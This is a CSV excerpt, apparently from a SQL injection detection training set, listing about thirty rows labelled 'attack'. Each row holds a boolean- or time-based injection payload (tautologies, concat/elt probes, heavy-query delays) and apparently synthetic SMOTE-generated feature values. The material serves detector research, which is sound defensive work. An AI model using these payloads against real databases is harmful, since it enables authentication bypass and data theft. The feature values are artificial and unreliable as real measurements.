id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000254,attack,boolean,admin'  )   or '1'  =  '1'--,nearest_attack_euclidean,R000082,0.7672735191997057,26.04001152741735,12.287276919060853,2.998025164285302,6.287276919060851,2.0,9.46545768929564,8.287276919060854,0.23689847277685394,0.07966381711169182,0.36687542022290853,0.31656228988854573,4.287276919060853,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,0.8218192297652136,0.0,0.0,0.17818077023478684,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.8218192297652133,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000255,attack,boolean,"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",nearest_attack_euclidean,R002331,0.10103126524441224,289.9565093784178,35.0,3.8238131493942484,63.956509378417806,79.0,111.0,36.0,0.22057237942396402,0.2724547877234816,0.38281622072539817,0.12415661212715617,4.0,-1.1102230246251565e-16,0.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,5.0,0.0,1.0,1.0,0.9565093784178073,0.043490621582192746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000256,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000410,0.1592779250212768,136.69277682217134,29.0,3.847305568572827,67.69277682217134,8.0,45.0,16.0,0.4949085212622961,0.05856133086813958,0.3294074861332852,0.11712266173627917,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,7.0,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000257,attack,boolean,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'lxoc'  =  'lxoc",nearest_attack_euclidean,R002455,0.16295574461281448,272.0,32.21902552434837,3.7437775632367973,59.0,71.0,108.0,34.0,0.21691176470588236,0.2610294117647059,0.39705882352941174,0.125,4.0,-1.1102230246251565e-16,0.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,3.9999999999999996,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000258,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000980,0.14258385447445251,128.8758866130868,28.375177322617358,3.999409151652082,75.0,5.0,31.500709290469434,17.375177322617358,0.5821587034131765,0.038810580227545105,0.24423249114155418,0.13479822521772425,0.0,3.0,0.0,0.0,1.0,0.0,0.0,4.3751773226173585,0.0,5.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000259,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R002645,0.08259564734537138,303.89816884675406,39.834941839412686,4.033378744147702,118.0,34.0,110.56805252557945,41.33011632117462,0.38844641952198694,0.11192523952328438,0.3636439272381946,0.13598441371653408,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,22.33011632117462,0.0,3.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000260,attack,boolean,"-6629%""   )    )     )   or 8571  =  8571--",nearest_attack_euclidean,R002509,0.009442442217155626,43.0,15.0,2.9583846563408986,2.0,12.0,20.0,9.0,0.046511627906976716,0.27906976744186046,0.46511627906976744,0.20930232558139536,0.0,1.0,3.0,0.0,0.0,1.0,0.0,3.000000000000001,1.0,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000261,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000488,1.6858739404357614e-07,138.0,28.0,3.3987538995167617,46.0,13.0,64.0,15.0,0.3333333333333333,0.09420289855072464,0.463768115942029,0.10869565217391304,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000262,attack,boolean,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",nearest_attack_euclidean,R002558,0.003625943039100633,168.00209336007327,30.004186720146564,3.8489083661428967,83.00837344029313,8.0,56.99581327985344,19.99790663992672,0.49409104638923507,0.0476184577740002,0.33925673814776,0.11903375768900475,0.0,4.0,0.0,0.0,1.0,1.9979066399267187,0.0,8.0,0.0,0.0,2.0,2.9979066399267187,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000263,attack,boolean,"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000344,0.38066082197077883,151.98683381796437,30.0,3.870684312827049,71.66227793932146,8.0,51.278190753122495,21.046365125520417,0.4721686581657801,0.052889647555217786,0.3362585314062637,0.13868316287273844,0.0,4.0,0.0,0.0,1.0,2.0,0.0,7.046365125520416,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000264,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'ujcx'  =  'ujcx",nearest_attack_euclidean,R001560,0.09518432844122726,91.60101246360398,22.0,3.0577905885099157,17.0,13.0,46.88080997088319,14.720202492720798,0.1858767700633155,0.1421410594601824,0.5113443100193218,0.16063786045718026,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,7.720202492720798,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000265,attack,boolean,"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001916,0.31867092459296015,113.07919573613461,33.0,3.5920159270207703,31.0,15.0,49.90707364318047,17.17212209295414,0.2749881337756219,0.133058774407559,0.4403367730028542,0.1516163188139649,2.3907073643180463,-1.1102230246251565e-16,2.0,1.0,0.0,1.0,0.0,9.781414728636094,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000266,attack,boolean,"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000822,0.007210488002707935,132.8100379908075,34.0,3.7951220618759263,42.94301139724225,21.0,52.88602279448451,15.981003799080751,0.3233474537380063,0.1581601704832685,0.3981574967165907,0.12033487906213453,0.0,1.0,2.0,0.0,1.0,2.0,0.0,7.981003799080751,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000267,attack,boolean,"-3081""   )    )     )   or 3736  =  1899",nearest_attack_euclidean,R000377,0.0004953659658730608,40.0,14.0,2.7734276977737307,2.0,12.0,20.0,6.0,0.04999999999999999,0.3,0.5,0.15,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.000000000000001,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000268,attack,boolean,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000285,0.7903235127492907,120.52309559540994,27.523095595409945,3.9986214196868923,62.0,10.0,29.999999999999996,18.523095595409945,0.5144330628846132,0.08297307465880857,0.24891922397642574,0.1536746384801525,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.5230955954099467,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000269,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",nearest_attack_euclidean,R001280,0.05742117984719348,158.03284524960048,35.0,3.852814962151431,59.0,10.0,62.20351961731805,26.82932563228244,0.3735965156468053,0.063321443329967,0.39331607619934184,0.16976596482388584,0.0,3.0,0.0,0.0,0.0,1.0,0.0,12.82932563228244,0.0,2.0,1.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000270,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'pfal'  =  'pfal,nearest_attack_euclidean,R002774,0.2837761173795554,84.36485713393235,19.0,2.950580085737088,14.0,13.0,43.49188570714588,13.87297142678647,0.16651277779513152,0.15461900795262215,0.5145495237797745,0.1643186904724718,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.872971426786469,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,boolean,1' in boolean mode  )   and 4595  =  4595#,nearest_attack_euclidean,R002485,0.100299160559119,42.0,18.47693348664522,3.626015258963868,16.0,9.0,13.0,4.0,0.38095238095238093,0.21428571428571427,0.30952380952380953,0.09523809523809523,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000272,attack,boolean,"1"" and make_set  (  4214  =  9503,9503  )   and ""phjg"" like ""phjg",nearest_attack_euclidean,R002224,0.35442218528205616,64.82145662766587,27.4643698829976,4.14944470805657,24.28582651066347,13.0,18.357086744668266,9.178543372334133,0.3745294008417016,0.20055794803854418,0.2832751007465028,0.1416375503732514,0.0,4.0,0.0,0.0,0.0,1.178543372334133,0.0,2.0,0.0,1.0,1.0,1.1785433723341328,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000273,attack,boolean,x' or full_name like '%bob%,nearest_attack_euclidean,R000145,1.407012355523577,22.422543572314993,15.169017428926,3.723116966121064,14.795780500620502,0.0,4.0,3.626763071694498,0.6576912619065001,0.0,0.18803883597111112,0.1542699021223889,1.5422543572315,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,1.5422543572315,0.5422543572315,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000274,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R002260,0.7280091263799532,26.461855130846573,15.84659718318521,3.594656701576959,4.769484104677261,12.0,6.692371026169319,3.0,0.17511556544391907,0.4572325130898153,0.2533437931938118,0.11430812827245382,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000275,attack,boolean,"1%' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003251,0.10857670311318168,178.93420406208108,31.93420406208108,3.7182497532959156,53.0,25.0,70.0,30.93420406208108,0.29619883198511404,0.13971643018165755,0.3912060045086411,0.17287873332458728,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,16.0,0.9342040620810794,1.0,3.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000276,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R003218,0.03534519163824298,128.19361714624486,28.077446858497947,3.8371527008450945,72.0,3.038723429248975,37.07744685849795,16.077446858497947,0.5616811304905057,0.023694534040480164,0.2892239992643725,0.12540033620464164,3.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.0,1.0,0.0,2.0387234292489733,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000277,attack,boolean,"1'   )    )    as pstn where 6691  =  6691 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R001656,0.8905761793078033,389.04499752369736,31.348332507899112,3.3776079385449655,102.6516674921009,56.04499752369735,177.0,53.34833250789911,0.26386355526402244,0.14404635335902663,0.45496635271907593,0.13712373865787497,1.0,-1.1102230246251565e-16,2.348332507899112,0.0,0.0,3.0,0.0,36.0,0.0,0.0,1.0,15.348332507899112,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,1.0,0.0,0.6516674921008879,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000278,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,nearest_attack_euclidean,R001999,0.1455365598367883,341.8104874728606,36.936829157620174,3.627559663277924,94.87365831524036,45.0,144.93682915762017,57.0,0.27755843457507007,0.13165316123399884,0.4240277332945325,0.16676067089639854,0.031585421189912255,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,30.0,0.0,3.0,0.0,22.0,0.03158542118991242,0.0,0.0,0.9684145788100875,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000279,attack,boolean,"1%""   )    )    and   (  7817  =  4371  )  *4371 and    (    (   ""%""  =  """,nearest_attack_euclidean,R002888,0.4980097307748871,69.0407283755164,15.354233687463115,2.8109431769068767,6.0,13.0,35.74919575044263,14.291532625073772,0.08778279949254542,0.19019606556718172,0.5143719257910132,0.20764920914925972,0.0,4.0,0.0,0.0,1.0,2.0,0.0,5.291532625073772,2.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000280,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R002064,0.007159449787543453,72.95209005153498,26.009581989693,3.775401897329173,14.0,24.0,23.961672041227995,10.990418010306998,0.19191594264272965,0.328998758816108,0.3284351123635785,0.1506501861775838,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.990418010306999,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,boolean,"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000603,0.4482599567779523,258.0897967562636,32.0,3.7486734477772456,51.18998152329669,71.0,101.5198521863735,34.379963046593375,0.198371015265018,0.27517299318681654,0.3932599263238129,0.1331960652243525,4.0,-1.1102230246251565e-16,0.0,0.0,2.0,2.0,0.0,18.379963046593375,2.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,3.9999999999999996,0.0,0.0,1.0,1.1899815232966886,0.8100184767033114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000282,attack,boolean,-5031' or 9323  =  9323#,nearest_attack_euclidean,R002358,0.047578957687415865,24.0,12.71670753769197,3.274801862004515,2.0,12.0,6.0,4.0,0.08333333333333331,0.5,0.25,0.16666666666666666,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000283,attack,boolean,"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001118,0.0684095175906484,238.4568112815331,37.0,3.7544816756378725,72.0,27.0,96.76544902522649,42.691362256306626,0.3019700281512343,0.11323876055671288,0.4057613521358885,0.1790298591561643,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,22.691362256306622,0.0,2.0,4.0,13.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
